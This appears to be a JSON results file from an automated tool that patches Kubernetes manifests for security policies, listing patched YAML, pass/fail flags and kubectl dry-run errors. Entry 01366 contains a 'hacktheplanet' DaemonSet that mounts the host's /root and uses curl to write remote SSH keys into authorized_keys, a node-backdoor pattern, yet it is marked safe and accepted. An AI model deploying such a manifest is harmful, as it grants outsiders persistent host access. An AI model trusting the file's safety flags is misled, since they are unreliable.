    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test-deployment\n  labels:\n    app: test-deployment\nspec:\n  selector:\n    matchLabels:\n      app: test-deployment\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test-deployment\n    spec:\n      containers:\n      - name: tester\n        image: ubuntu:stable\n        command:\n        - bash\n        - -c\n        - 'echo \"Falling asleep for $SECS_TO_SLEEP\"\n\n          sleep $SECS_TO_SLEEP\n\n          '\n        env:\n        - name: SECS_TO_SLEEP\n          value: '1000'\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01342",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: rok-secret-name-secret\n              key: rok_secret_name\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "errors": []
  },
  {
    "id": "01343",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: rok-secret-name-secret\n              key: rok_secret_name\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "errors": []
  },
  {
    "id": "01344",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: rok-secret-name-secret\n              key: rok_secret_name\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "errors": []
  },
  {
    "id": "01345",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: rok-secret-name-secret\n              key: rok_secret_name\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images.csv-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "errors": []
  },
  {
    "id": "01346",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01347",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01348",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01349",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01350",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01351",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01352",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01353",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01354",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01355",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01356",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01357",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"tf-r1.15.4-mnasnet-func-v3-32\" namespace: \"automated\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01358",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "errors": []
  },
  {
    "id": "01359",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "errors": []
  },
  {
    "id": "01360",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "errors": []
  },
  {
    "id": "01361",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "errors": []
  },
  {
    "id": "01362",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"mainnet-dump-staking-ledger-cronjob\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01363",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"mainnet-dump-staking-ledger-cronjob\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01364",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"mainnet-dump-staking-ledger-cronjob\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01365",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"mainnet-dump-staking-ledger-cronjob\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01366",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01367",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
